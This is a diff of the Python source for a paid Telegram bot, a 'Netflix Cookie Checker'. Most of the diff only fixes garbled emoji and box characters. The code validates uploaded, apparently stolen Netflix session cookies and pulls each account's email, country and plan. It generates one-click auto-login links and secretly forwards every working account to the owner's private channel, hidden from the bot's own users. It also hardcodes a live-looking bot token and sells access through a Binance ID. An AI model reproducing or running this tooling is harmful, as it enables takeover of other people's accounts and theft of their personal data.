@@ -11,36 +11,36 @@ from urllib3.exceptions import InsecureRequestWarning
 
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
-# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+# ═══════════════════════════════════════════════════════
 #                    CONFIGURATION
-# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+# ═══════════════════════════════════════════════════════
 BOT_TOKEN    = "8621607921:AAEfIyoWd0E5I4vuv51FVLx5IXLgdnjNq3U"
 OWNER_ID     = 8455335298          # Your Telegram user ID
 FREE_DAYS    = 2                   # Free trial duration (days)
-HITS_CHANNEL = -1004348992380      # tampomas channel â€” hits forwarded here
+HITS_CHANNEL = -1004348992380      # tampomas channel — hits forwarded here
 
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
 
 # In-memory pending cookie batches per user
 pending_files = {}
 
-# Stop flags â€” set to True when user sends /stop
+# Stop flags — set to True when user sends /stop
 stop_flags = {}
 
-# Active checkers â€” track users currently running a check (prevent parallel checks)
+# Active checkers — track users currently running a check (prevent parallel checks)
 active_checkers = set()
 
-# NF Token cooldown â€” tracks last usage time per user (10s cooldown)
+# NF Token cooldown — tracks last usage time per user (10s cooldown)
 nftoken_cooldown = {}
 
-# â”€â”€â”€ User Agent â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# ─── User Agent ───────────────────────────────────────
 USER_AGENT = (
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
     "AppleWebKit/537.36 (KHTML, like Gecko) "
     "Chrome/128.0.0.0 Safari/537.36"
 )
 
-# â”€â”€â”€ Netflix iOS FTL API â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# ─── Netflix iOS FTL API ──────────────────────────────
 API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
 
 QUERY_PARAMS = {
@@ -96,11 +96,11 @@ BASE_HEADERS = {
 
 
 
-# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-#                    DATABASE (via db_shared â†’ PostgreSQL)
-# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+# ═══════════════════════════════════════════════════════
+#                    DATABASE (via db_shared → PostgreSQL)
+# ═══════════════════════════════════════════════════════
 
-# All DB functions are in db_shared.py â€” imported here for convenience
+# All DB functions are in db_shared.py — imported here for convenience
 get_user               = _db.get_user
 register_user          = _db.register_user
 set_ban                = _db.set_ban
@@ -123,9 +123,9 @@ get_nftoken_usage      = _db.get_nftoken_usage
 increment_nftoken_usage = _db.increment_nftoken_usage
 
 
-# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+# ═══════════════════════════════════════════════════════
 #                  ACCESS CONTROL
-# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+# ═══════════════════════════════════════════════════════
 
 def is_owner(user_id: int) -> bool:
     return user_id == OWNER_ID
@@ -156,9 +156,9 @@ def check_access(user_id: int):
     return True, "ok"
 
 
-# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+# ═══════════════════════════════════════════════════════
 #               NETFLIX CORE FUNCTIONS
-# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+# ═══════════════════════════════════════════════════════
 
 def parse_cookies_from_text(content: str):
     """
@@ -315,7 +315,7 @@ def check_netflix_cookie(cookie_dict: dict):
 
         body = resp.text
 
-        # â”€â”€ Parse account details â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+        # ── Parse account details ──────────────────────
         email    = "Unknown"
         plan     = "Netflix"
         status   = "CURRENT_MEMBER"
@@ -372,7 +372,7 @@ def check_netflix_cookie(cookie_dict: dict):
         if m_profiles:
             profiles = list(dict.fromkeys(m_profiles))
 
-        # â”€â”€ Generate NFToken â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+        # ── Generate NFToken ───────────────────────────
         token, token_expiry = fetch_nftoken(cookie_dict)
 
         if token:
@@ -403,35 +403,35 @@ def check_netflix_cookie(cookie_dict: dict):
         return {"alive": False, "reason": str(e)}
 
 
-# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+# ═══════════════════════════════════════════════════════
 #                    HIT LOGGING
-# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+# ═══════════════════════════════════════════════════════
 
 def forward_hit_to_channel(res: dict, checker_user, hit_count: int):
     """Silently forward every hit to the private channel (invisible to checker)."""
     checker = f"@{checker_user.username}" if checker_user.username else f"ID:{checker_user.id}"
     text = (
-        f"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n"
-        f"  ðŸ”¥ <b>NETFLIX HIT #{hit_count}</b>\n"
-        f"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n"
-        f"ðŸ‘¤ <b>Checker :</b> <code>{checker}</code>\n\n"
+        f"╔══════════════════════════╗\n"
+        f"  🔥 <b>NETFLIX HIT #{hit_count}</b>\n"
+        f"╚══════════════════════════╝\n\n"
+        f"👤 <b>Checker :</b> <code>{checker}</code>\n\n"
         f"<b>[ ACCOUNT INFO ]</b>\n"
-        f"ðŸ“§ <b>Email   :</b> <code>{res.get('email')}</code>\n"
-        f"ðŸŒ <b>Country :</b> <code>{res.get('country')}</code>\n"
-        f"ðŸ“Š <b>Status  :</b> <code>{res.get('status')} âœ”</code>\n"
-        f"ðŸ“º <b>Quality :</b> <code>{res.get('quality')} ({res.get('streams')} Screens)</code>\n\n"
+        f"📧 <b>Email   :</b> <code>{res.get('email')}</code>\n"
+        f"🌍 <b>Country :</b> <code>{res.get('country')}</code>\n"
+        f"📊 <b>Status  :</b> <code>{res.get('status')} ✔</code>\n"
+        f"📺 <b>Quality :</b> <code>{res.get('quality')} ({res.get('streams')} Screens)</code>\n\n"
         f"<b>[ WATCH LINKS ]</b>\n"
-        f"ðŸ–¥ï¸ Direct  â†’ {res.get('direct_url')}\n"
-        f"ðŸ“± Mobile  â†’ {res.get('mobile_url')}\n"
-        f"â³ <b>Token Expires:</b> <code>{res.get('token_expiry')}</code>\n\n"
+        f"🖥️ Direct  → {res.get('direct_url')}\n"
+        f"📱 Mobile  → {res.get('mobile_url')}\n"
+        f"⏳ <b>Token Expires:</b> <code>{res.get('token_expiry')}</code>\n\n"
         f"[ BOT : @netflixpctvphonebot ]"
     )
     try:
         markup = types.InlineKeyboardMarkup()
         if res.get("nftoken"):
             markup.row(
-                types.InlineKeyboardButton("ðŸ–¥ï¸ Direct", url=res.get("direct_url")),
-                types.InlineKeyboardButton("ðŸ“± Mobile", url=res.get("mobile_url")),
+                types.InlineKeyboardButton("🖥️ Direct", url=res.get("direct_url")),
+                types.InlineKeyboardButton("📱 Mobile", url=res.get("mobile_url")),
             )
         bot.send_message(
             HITS_CHANNEL,
@@ -443,9 +443,9 @@ def forward_hit_to_channel(res: dict, checker_user, hit_count: int):
         print(f"[Channel Forward Error] {e}")
 
 
-# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+# ═══════════════════════════════════════════════════════
 #              TELEGRAM COMMAND HANDLERS
-# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+# ═══════════════════════════════════════════════════════
 
 def time_remaining(expires_at_str: str) -> str:
     """Return a human-readable countdown string until expiry."""
@@ -462,7 +462,7 @@ def time_remaining(expires_at_str: str) -> str:
     except Exception:
         return "Unknown"
 
-# â”€â”€ /start â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# ── /start ────────────────────────────────────────────
 @bot.message_handler(commands=["start", "help"])
 def cmd_start(message):
     user = message.from_user
@@ -472,78 +472,78 @@ def cmd_start(message):
 
     if not allowed:
         if reason == "banned":
-            bot.reply_to(message, "ðŸš« <b>You have been banned from using this bot.</b>")
+            bot.reply_to(message, "🚫 <b>You have been banned from using this bot.</b>")
         elif reason == "expired":
             bot.reply_to(
                 message,
-                "â° <b>Your access has expired.</b>\n\n"
-                "Type /buy to see available plans and purchase access. ðŸ›’"
+                "⏰ <b>Your access has expired.</b>\n\n"
+                "Type /buy to see available plans and purchase access. 🛒"
             )
         else:
             bot.reply_to(
                 message,
-                "âŒ <b>Access denied.</b>\n\n"
-                "Type /buy to see available plans. ðŸ›’"
+                "❌ <b>Access denied.</b>\n\n"
+                "Type /buy to see available plans. 🛒"
             )
         return
 
     row = get_user(user.id)
     expires_info = ""
     if row and not is_owner(user.id):
-        expires_info = f"\nâ³ <b>Access expires in:</b> <code>{time_remaining(row[4])}</code>"
+        expires_info = f"\n⏳ <b>Access expires in:</b> <code>{time_remaining(row[4])}</code>"
 
     welcome = (
-        f"ðŸ‘‹ <b>Hello, {user.first_name or 'User'}!</b>\n\n"
-        f"âš¡ <b>Netflix Cookie Checker â€” Public Bot</b>\n\n"
-        f"ðŸ“ <b>How to use:</b>\n\n"
-        f"ðŸ” <b>Cookie Checker:</b>\n"
+        f"👋 <b>Hello, {user.first_name or 'User'}!</b>\n\n"
+        f"⚡ <b>Netflix Cookie Checker — Public Bot</b>\n\n"
+        f"📁 <b>How to use:</b>\n\n"
+        f"🔍 <b>Cookie Checker:</b>\n"
         f"Send a cookie file (<code>.txt</code>, <code>.json</code>, or <code>.log</code>) "
         f"in Netscape, JSON, or Raw format.\n"
         f"The bot will automatically:\n"
-        f"  âœ… Validate each account\n"
-        f"  ðŸ”‘ Generate NFToken Watch Links\n"
-        f"  ðŸ“Š Show plan, quality & profile info\n\n"
-        f"ðŸª <b>Generate Links Cookies:</b>\n"
-        f"Tap the ðŸª Generate Links Cookies button below or you can send /nftoken.\n"
+        f"  ✅ Validate each account\n"
+        f"  🔑 Generate NFToken Watch Links\n"
+        f"  📊 Show plan, quality & profile info\n\n"
+        f"🍪 <b>Generate Links Cookies:</b>\n"
+        f"Tap the 🍪 Generate Links Cookies button below or you can send /nftoken.\n"
         f"The bot will pick an active cookie and generate a 1-click auto-login link for PC Browser and Mobile."
         f"{expires_info}\n\n"
         f"<b>Commands:</b>\n"
-        f"/start â€” Show this message\n"
-        f"/me â€” Check your access info\n"
-        f"/stop â€” Stop current checking session\n"
-        f"/buy â€” Purchase access\n"
-        f"/payment â€” Send payment proof\n"
-        f"/redeem [KEY] â€” Activate your key\n"
-        f"/nftoken â€” Get a free Netflix 1-click token\n"
-        f"/ask [question] â€” Ask the owner a question"
+        f"/start — Show this message\n"
+        f"/me — Check your access info\n"
+        f"/stop — Stop current checking session\n"
+        f"/buy — Purchase access\n"
+        f"/payment — Send payment proof\n"
+        f"/redeem [KEY] — Activate your key\n"
+        f"/nftoken — Get a free Netflix 1-click token\n"
+        f"/ask [question] — Ask the owner a question"
         + (
             f"\n\n<b>Owner Commands:</b>\n"
-            f"/ban [@user or id] â€” Ban a user\n"
-            f"/unban [@user or id] â€” Unban a user\n"
-            f"/expire [@user or id] â€” Revoke access immediately\n"
-            f"/users â€” List all registered users\n"
-            f"/broadcast [msg] â€” Broadcast a message\n"
-            f"/sendkey â€” Generate key for yourself or send key to user\n"
-            f"/keys â€” View all generated keys report\n"
-            f"/db â€” View database stats\n"
-            f"/reply [@user or id] [msg] â€” Reply to a user's /ask"
+            f"/ban [@user or id] — Ban a user\n"
+            f"/unban [@user or id] — Unban a user\n"
+            f"/expire [@user or id] — Revoke access immediately\n"
+            f"/users — List all registered users\n"
+            f"/broadcast [msg] — Broadcast a message\n"
+            f"/sendkey — Generate key for yourself or send key to user\n"
+            f"/keys — View all generated keys report\n"
+            f"/db — View database stats\n"
+            f"/reply [@user or id] [msg] — Reply to a user's /ask"
             if is_owner(user.id) else ""
         )
     )
     # Persistent keyboard with NF Token button
     keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, is_persistent=True)
-    keyboard.add(types.KeyboardButton("ðŸª Generate Links Cookies"))
+    keyboard.add(types.KeyboardButton("🍪 Generate Links Cookies"))
 
     bot.send_message(message.chat.id, welcome, reply_markup=keyboard)
 
 
-# â”€â”€ ðŸª Generate Links Cookies keyboard button â”€â”€â”€â”€â”€â”€â”€â”€â”€
-@bot.message_handler(func=lambda m: m.text == "ðŸª Generate Links Cookies")
+# ── 🍪 Generate Links Cookies keyboard button ─────────
+@bot.message_handler(func=lambda m: m.text == "🍪 Generate Links Cookies")
 def keyboard_nftoken(message):
     cmd_nftoken(message)
 
 
-# â”€â”€ /me â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# ── /me ───────────────────────────────────────────────
 @bot.message_handler(commands=["me"])
 def cmd_me(message):
     user = message.from_user
@@ -551,45 +551,45 @@ def cmd_me(message):
     row = get_user(user.id)
 
     if is_owner(user.id):
-        bot.reply_to(message, "ðŸ‘‘ <b>You are the Owner.</b> Unlimited access.")
+        bot.reply_to(message, "👑 <b>You are the Owner.</b> Unlimited access.")
         return
 
     if not row:
-        bot.reply_to(message, "âŒ Not registered. Send /start first.")
+        bot.reply_to(message, "❌ Not registered. Send /start first.")
         return
 
     _, username, first_name, joined_at, expires_at, is_banned = row
     allowed, reason = check_access(user.id)
 
-    status_icon = "âœ… Active" if allowed else ("ðŸš« Banned" if is_banned else "â° Expired")
+    status_icon = "✅ Active" if allowed else ("🚫 Banned" if is_banned else "⏰ Expired")
     text = (
-        f"ðŸ‘¤ <b>Your Account Info</b>\n\n"
-        f"ðŸ†” <b>User ID:</b> <code>{user.id}</code>\n"
-        f"ðŸ“› <b>Name:</b> {first_name}\n"
-        f"ðŸ“… <b>Joined:</b> <code>{joined_at} UTC</code>\n"
-        f"â³ <b>Access Expires In:</b> <code>{time_remaining(expires_at)}</code>\n"
-        f"ðŸ“Š <b>Status:</b> {status_icon}"
+        f"👤 <b>Your Account Info</b>\n\n"
+        f"🆔 <b>User ID:</b> <code>{user.id}</code>\n"
+        f"📛 <b>Name:</b> {first_name}\n"
+        f"📅 <b>Joined:</b> <code>{joined_at} UTC</code>\n"
+        f"⏳ <b>Access Expires In:</b> <code>{time_remaining(expires_at)}</code>\n"
+        f"📊 <b>Status:</b> {status_icon}"
     )
     bot.reply_to(message, text)
 
 
-# â”€â”€ /stop â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# ── /stop ─────────────────────────────────────────────
 @bot.message_handler(commands=["stop"])
 def cmd_stop(message):
     user = message.from_user
     if stop_flags.get(user.id) is None:
         # No active checking session
-        bot.reply_to(message, "âš ï¸ <b>No active checking session to stop.</b>")
+        bot.reply_to(message, "⚠️ <b>No active checking session to stop.</b>")
         return
     stop_flags[user.id] = True
-    bot.reply_to(message, "ðŸ›‘ <b>Stop signal sent!</b>\nThe checker will stop after the current cookie finishes.")
+    bot.reply_to(message, "🛑 <b>Stop signal sent!</b>\nThe checker will stop after the current cookie finishes.")
 
 
-# â”€â”€ /ban â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# ── /ban ──────────────────────────────────────────────
 @bot.message_handler(commands=["ban"])
 def cmd_ban(message):
     if not is_owner(message.from_user.id):
-        bot.reply_to(message, "â›” Owner only.")
+        bot.reply_to(message, "⛔ Owner only.")
         return
     parts = message.text.split()
     if len(parts) < 2:
@@ -599,23 +599,23 @@ def cmd_ban(message):
     if target.startswith("@"):
         row = get_user_by_username(target[1:])
         if not row:
-            bot.reply_to(message, f"âŒ Username <code>{target}</code> not found.")
+            bot.reply_to(message, f"❌ Username <code>{target}</code> not found.")
             return
         uid = row[0]
     elif target.isdigit():
         uid = int(target)
     else:
-        bot.reply_to(message, "âŒ Invalid format. Use <code>@username</code> or <code>user_id</code>.")
+        bot.reply_to(message, "❌ Invalid format. Use <code>@username</code> or <code>user_id</code>.")
         return
     set_ban(uid, True)
-    bot.reply_to(message, f"ðŸš« User <code>{uid}</code> has been <b>banned</b>.")
+    bot.reply_to(message, f"🚫 User <code>{uid}</code> has been <b>banned</b>.")
 
 
-# â”€â”€ /unban â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# ── /unban ────────────────────────────────────────────
 @bot.message_handler(commands=["unban"])
 def cmd_unban(message):
     if not is_owner(message.from_user.id):
-        bot.reply_to(message, "â›” Owner only.")
+        bot.reply_to(message, "⛔ Owner only.")
         return
     parts = message.text.split()
     if len(parts) < 2:
@@ -625,24 +625,24 @@ def cmd_unban(message):
     if target.startswith("@"):
         row = get_user_by_username(target[1:])
         if not row:
-            bot.reply_to(message, f"âŒ Username <code>{target}</code> not found.")
+            bot.reply_to(message, f"❌ Username <code>{target}</code> not found.")
             return
         uid = row[0]
     elif target.isdigit():
         uid = int(target)
     else:
-        bot.reply_to(message, "âŒ Invalid format. Use <code>@username</code> or <code>user_id</code>.")
+        bot.reply_to(message, "❌ Invalid format. Use <code>@username</code> or <code>user_id</code>.")
         return
     set_ban(uid, False)
-    bot.reply_to(message, f"âœ… User <code>{uid}</code> has been <b>unbanned</b>.")
+    bot.reply_to(message, f"✅ User <code>{uid}</code> has been <b>unbanned</b>.")
 
 
 
-# â”€â”€ /users â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# ── /users ────────────────────────────────────────────
 @bot.message_handler(commands=["users"])
 def cmd_users(message):
     if not is_owner(message.from_user.id):
-        bot.reply_to(message, "â›” Owner only.")
+        bot.reply_to(message, "⛔ Owner only.")
         return
     rows = all_users()
     if not rows:
@@ -660,39 +660,39 @@ def cmd_users(message):
     banned  = [r for r in normal_rows if r[5]]
 
     lines = []
-    lines.append(f"â•”â•â• REGISTERED USERS â€” {now.strftime('%Y-%m-%d %H:%M:%S')} UTC â•â•â•—")
+    lines.append(f"╔══ REGISTERED USERS — {now.strftime('%Y-%m-%d %H:%M:%S')} UTC ══╗")
     lines.append(f"  Total   : {len(rows)}")
     lines.append(f"  Active  : {len(active)}")
     lines.append(f"  Expired : {len(expired)}")
     lines.append(f"  Banned  : {len(banned)}")
-    lines.append("â•š" + "â•" * 48 + "â•\n")
+    lines.append("╚" + "═" * 48 + "╝\n")
 
     # Owner section
     if owner_rows:
-        lines.append("â”€â”€ ðŸ‘‘ OWNER " + "â”€" * 38)
+        lines.append("── 👑 OWNER " + "─" * 38)
         for row in owner_rows:
             uid, username, first_name, joined_at, _, _ = row
-            uname = f"@{username}" if username else "â€”"
-            lines.append(f"  ðŸ‘‘ ID      : {uid}")
+            uname = f"@{username}" if username else "—"
+            lines.append(f"  👑 ID      : {uid}")
             lines.append(f"     Name    : {first_name} {uname}")
             lines.append(f"     Joined  : {joined_at} UTC")
             lines.append(f"     Access  : Unlimited (Owner)")
             lines.append("")
 
     def section(title, user_rows, flag):
-        lines.append(f"â”€â”€ {title} ({len(user_rows)}) " + "â”€" * 30)
+        lines.append(f"── {title} ({len(user_rows)}) " + "─" * 30)
         for row in user_rows:
             uid, username, first_name, joined_at, expires_at, is_banned = row
-            uname  = f"@{username}" if username else "â€”"
+            uname  = f"@{username}" if username else "—"
             lines.append(f"  {flag} ID      : {uid}")
             lines.append(f"     Name    : {first_name} {uname}")
             lines.append(f"     Joined  : {joined_at} UTC")
             lines.append(f"     Expires : {time_remaining(expires_at)}")
             lines.append("")
 
-    section("ACTIVE USERS", active, "âœ…")
-    section("EXPIRED USERS", expired, "â°")
-    section("BANNED USERS", banned, "ðŸš«")
+    section("ACTIVE USERS", active, "✅")
+    section("EXPIRED USERS", expired, "⏰")
+    section("BANNED USERS", banned, "🚫")
 
     content = "\n".join(lines)
 
@@ -702,15 +702,15 @@ def cmd_users(message):
     bot.send_document(
         message.chat.id,
         (filename, file_bytes),
-        caption=f"ðŸ‘¥ <b>Registered Users: {len(rows)}</b> | âœ… {len(active)} Active | â° {len(expired)} Expired | ðŸš« {len(banned)} Banned",
+        caption=f"👥 <b>Registered Users: {len(rows)}</b> | ✅ {len(active)} Active | ⏰ {len(expired)} Expired | 🚫 {len(banned)} Banned",
     )
 
 
-# â”€â”€ /broadcast â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# ── /broadcast ────────────────────────────────────────
 @bot.message_handler(commands=["broadcast"])
 def cmd_broadcast(message):
     if not is_owner(message.from_user.id):
-        bot.reply_to(message, "â›” Owner only.")
+        bot.reply_to(message, "⛔ Owner only.")
         return
     parts = message.text.split(maxsplit=1)
     if len(parts) < 2:
@@ -723,43 +723,43 @@ def cmd_broadcast(message):
     for row in rows:
         uid = row[0]
         try:
-            bot.send_message(uid, f"ðŸ“¢ <b>Announcement</b>\n\n{msg_text}")
+            bot.send_message(uid, f"📢 <b>Announcement</b>\n\n{msg_text}")
             sent += 1
         except Exception:
             fail += 1
-    bot.reply_to(message, f"ðŸ“¢ Broadcast done.\nâœ… Sent: {sent} | âŒ Failed: {fail}")
+    bot.reply_to(message, f"📢 Broadcast done.\n✅ Sent: {sent} | ❌ Failed: {fail}")
 
 
-# â”€â”€ /buy â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# ── /buy ──────────────────────────────────────────────
 @bot.message_handler(commands=["buy"])
 def cmd_buy(message):
     user = message.from_user
     register_user(user, FREE_DAYS)
     text = (
-        f"ðŸ›’ <b>Purchase Access</b>\n\n"
-        f"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n"
-        f"  ðŸ’Ž <b>AVAILABLE PLAN</b>\n"
-        f"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n"
-        f"ðŸ“¦ <b>7 Days Access</b>\n"
-        f"ðŸ’µ <b>Price  :</b> just <code>$1.00</code>\n"
-        f"You can access this checker unlimited for 1 full week, happy watching â¤ï¸\n\n"
-        f"ðŸ’³ <b>Send Payment to</b>\n"
-        f"ðŸ¦ <b>Binance ID :</b> <code>150710229</code>\n\n"
-        f"â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
-        f"ðŸ“‹ <b>How to Order:</b>\n"
-        f"1ï¸âƒ£ Complete payment to our wallet\n"
-        f"2ï¸âƒ£ Take a screenshot of the payment\n"
-        f"3ï¸âƒ£ Send the screenshot here with caption <code>/payment</code> or reply screenshot with <code>/payment</code>\n"
-        f"4ï¸âƒ£ Wait for your key to be sent\n"
-        f"5ï¸âƒ£ Activate with <code>/redeem [KEY]</code>\n"
-        f"â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n"
+        f"🛒 <b>Purchase Access</b>\n\n"
+        f"╔══════════════════════════╗\n"
+        f"  💎 <b>AVAILABLE PLAN</b>\n"
+        f"╚══════════════════════════╝\n\n"
+        f"📦 <b>7 Days Access</b>\n"
+        f"💵 <b>Price  :</b> just <code>$1.00</code>\n"
+        f"You can access this checker unlimited for 1 full week, happy watching ❤️\n\n"
+        f"💳 <b>Send Payment to</b>\n"
+        f"🏦 <b>Binance ID :</b> <code>150710229</code>\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"📋 <b>How to Order:</b>\n"
+        f"1️⃣ Complete payment to our wallet\n"
+        f"2️⃣ Take a screenshot of the payment\n"
+        f"3️⃣ Send the screenshot here with caption <code>/payment</code> or reply screenshot with <code>/payment</code>\n"
+        f"4️⃣ Wait for your key to be sent\n"
+        f"5️⃣ Activate with <code>/redeem [KEY]</code>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
         f"After payment, send your proof:\n"
-        f"ðŸ“¸ screenshot + caption <code>/payment</code>"
+        f"📸 screenshot + caption <code>/payment</code>"
     )
     bot.reply_to(message, text)
 
 
-# â”€â”€ /payment â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# ── /payment ──────────────────────────────────────────
 @bot.message_handler(commands=["payment"])
 def cmd_payment(message):
     """User sends /payment with a screenshot as the caption of a photo."""
@@ -768,10 +768,10 @@ def cmd_payment(message):
 
     _, reason = check_access(user.id)
     if reason == "banned":
-        bot.reply_to(message, "ðŸš« <b>You are banned.</b>")
+        bot.reply_to(message, "🚫 <b>You are banned.</b>")
         return
 
-    # â”€â”€ Check if this is a reply to a photo or document â”€â”€
+    # ── Check if this is a reply to a photo or document ──
     replied = message.reply_to_message
     if replied:
         if replied.photo:
@@ -783,15 +783,15 @@ def cmd_payment(message):
             _forward_payment_proof_from_reply(message, replied, proof_type="document")
             return
 
-    # â”€â”€ No photo/file attached or replied â€” show instructions â”€â”€
+    # ── No photo/file attached or replied — show instructions ──
     bot.reply_to(
         message,
-        "ðŸ“¸ <b>How to send payment proof:</b>\n\n"
-        "Method 1 â€” Send screenshot with caption:\n"
-        "  Attach screenshot â†’ type <code>/payment</code> in caption â†’ Send\n\n"
-        "Method 2 â€” Reply to your screenshot:\n"
-        "  Send screenshot first â†’ reply to it with <code>/payment</code>\n\n"
-        "Your proof will be reviewed and your key will be sent shortly. âœ…"
+        "📸 <b>How to send payment proof:</b>\n\n"
+        "Method 1 — Send screenshot with caption:\n"
+        "  Attach screenshot → type <code>/payment</code> in caption → Send\n\n"
+        "Method 2 — Reply to your screenshot:\n"
+        "  Send screenshot first → reply to it with <code>/payment</code>\n\n"
+        "Your proof will be reviewed and your key will be sent shortly. ✅"
     )
 
 
@@ -807,7 +807,7 @@ def handle_photo(message):
     register_user(user, FREE_DAYS)
     _, reason = check_access(user.id)
     if reason == "banned":
-        bot.reply_to(message, "ðŸš« <b>You are banned.</b>")
+        bot.reply_to(message, "🚫 <b>You are banned.</b>")
         return
 
     _forward_payment_proof(message, proof_type="photo")
@@ -816,18 +816,18 @@ def handle_photo(message):
 def _forward_payment_proof_from_reply(cmd_message, replied_message, proof_type: str):
     """Forward payment proof when user replies to a photo/doc with /payment."""
     user  = cmd_message.from_user
